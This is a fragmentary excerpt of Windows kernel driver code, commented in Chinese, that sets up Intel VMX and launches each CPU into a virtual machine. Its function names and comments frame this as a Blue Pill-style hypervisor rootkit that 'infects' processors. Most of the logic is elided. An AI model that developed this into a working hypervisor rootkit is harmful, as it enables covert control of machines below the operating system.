...
{
    //CPU cpu;
	PCPU pCpu = &g_VMXCPU[KeGetCurrentProcessorNumber()];
    ULONG_PTR VMM_Stack;
    ...
    RtlZeroMemory (pCpu->VMM_Stack, 8 * PAGE_SIZE);
    //KdPrint(("CPU [%d] VMM_Stack : %p\n", cpu_i, pCpu->VMM_Stack));
...
#pragma warning(disable:4152)
    ...
    if ( VmxSetupVMCS (VMM_Stack, CmGuestEip, GuestRsp) )//CmGuestEip,即进入Guest之后要执行的代码GuestRip,GuestRsp
    {
    ...
    InterlockedIncrement ((LONG *)&g_uSubvertedCPUs);  // 已侵染的CPU数+=1

    // 一切准备工作完毕，使该CPU进入虚拟机
    __vmx_vmlaunch();

    // never reached
    InterlockedDecrement ((LONG*)&g_uSubvertedCPUs);
...
VOID FreeCpuMem()
{
	...
	pCpu = &g_VMXCPU[uCpuid];

	MmFreeContiguousMemory(pCpu->OriginaVmxonR);
	MmFreeContiguousMemory(pCpu->OriginalVmcs);
	ExFreePoolWithTag(pCpu->VMM_Stack,MEM_TAG);
...
HvmSwallowBluepill ()
{
    ...
    if (KeNumberProcessors != (CCHAR)g_uSubvertedCPUs)  // 如果没有对每个核都侵染成功，则撤销更改
    {
        HvmSpitOutBluepill ();
        return STATUS_UNSUCCESSFUL;
    }
